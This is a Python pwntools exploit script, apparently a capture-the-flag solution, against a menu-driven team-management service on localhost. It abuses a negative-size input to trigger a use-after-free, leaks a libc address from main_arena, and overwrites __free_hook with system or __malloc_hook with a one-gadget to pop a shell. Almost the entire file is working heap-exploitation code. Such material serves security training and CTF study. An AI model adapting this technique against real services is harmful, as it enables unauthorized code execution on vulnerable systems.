#-*-coding:utf8-*-
from pwn import *

main_arena_88_offset = 0x3be7b8

gadget_offset = 0x4647c
malloc_hook_offset = main_arena_88_offset - 88 - 0x20

system_offset = 0x46590
free_hook_offset = 0x3c0a10


def leak(r):
    # 1. Create Team
    r.recvuntil(">")
    r.send("1")
    r.recvuntil(":")
    r.send("0")
    
    # 3. Manager Team
    r.recvuntil(">")
    r.send("3")
    r.recvuntil(":")
    r.send("0")
    
    # 1. Add Member
    r.recvuntil(">")
    r.send("1")
    r.recvuntil(":")
    r.send("16")
    for i in range(16):
        r.recvuntil(":")
        r.send("name")
        r.recvuntil(":")
        r.send("/bin/sh")    #desc
    
    # VULN!
    r.recvuntil(">")
    r.send("1")
    r.recvuntil(":")
    r.send("-16")
    
    # UAF
    r.recvuntil(">")
    r.send("5")
    r.recvuntil(">")
    r.send("1")
    r.recvuntil(":")
    r.send("128")
    r.recvuntil(":")
    r.send("aaaaaaaa")
    
    # leak
    r.recvuntil(">")
    r.send("4")
    description = r.recvuntil(">")
    start = description.find("aaaaaaaa")
    end = description[start:].find("Size :")
    _main_arena_88 = description[start+8:start+end].ljust(8, "\x00")
    main_arena_88 = u64(_main_arena_88)
    libc_base = main_arena_88 - main_arena_88_offset
    print("libc_base :", hex(libc_base))
    
    return libc_base
    

def exploit(r, libc_base, exec_code):
    
    ## realloc(description1, 0)
    # 3. Manager Team
    r.send("3")
    r.recvuntil(":")
    r.send("0")
    
    # VULN!
    r.recvuntil(">")
    r.send("1")
    r.recvuntil(":")
    r.send("-16")
    
    # UAF & fill exec_point to description1
    r.recvuntil(">")
    r.send("5")
    r.recvuntil(">")
    r.send("1")
    r.recvuntil(":")
    r.send("128")
    r.recvuntil(":")
    if exec_code == "system":
        exec_point = libc_base + free_hook_offset
    else:  # one_gadget. free_hook을 사용해도 되긴 하다.
        exec_point = libc_base + malloc_hook_offset
    r.send(p64(exec_point))
    
    # 3. Manager Team
    r.recvuntil(">")
    r.send("3")
    r.recvuntil(":")
    r.send("0")
    
    # 4. Manager Member & write gadget to exec_point
    r.recvuntil(">")
    r.send("4")
    r.recvuntil(":")
    r.send("0")    # exec_point
    r.recvuntil(":")
    if exec_code == "system":
        r.send(p64(libc_base+system_offset))
    else:  # one_gadget
        r.send(p64(libc_base+gadget_offset))
    
    
    if exec_code == "system":
        r.recvuntil(">")
        r.send("2")
        r.recvuntil(":")
        r.send("3")
    else:  # one_gadget
    # call malloc() -> malloc_hook
        r.recvuntil(">")
        r.send("5")
        r.recvuntil(">")
        r.send("1")
        r.recvuntil(":")
        r.send("0")
    
    r.interactive()
    
    
if __name__ == "__main__":
    r = remote("127.0.0.1", 8787)
    
    libc_base = leak(r)
    # exploit(r, libc_base, "gadget") # 1
    exploit(r, libc_base, "system") # 2
    
    
    